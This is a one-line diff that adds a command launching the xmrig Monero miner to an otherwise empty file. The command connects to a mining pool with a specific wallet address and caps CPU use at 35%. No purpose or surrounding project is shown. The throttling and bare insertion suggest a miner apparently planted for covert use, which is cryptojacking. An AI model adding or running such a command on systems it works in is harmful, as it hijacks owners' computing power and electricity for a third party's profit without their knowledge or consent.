@@ -1,1 +1,1 @@
-
+xmrig.exe --url=pool.hashvault.pro:443 --user=8C9YNRuYjYu78KjCZojboLApngcriAWP7XiAz3pef7fgSjpZBXeRjzKUMBStV62UzQKPoBc2StmytV79LnodTB8gVGffg1G --pass=REDPANDA --tls --keepalive --cpu-max-threads-hint=35
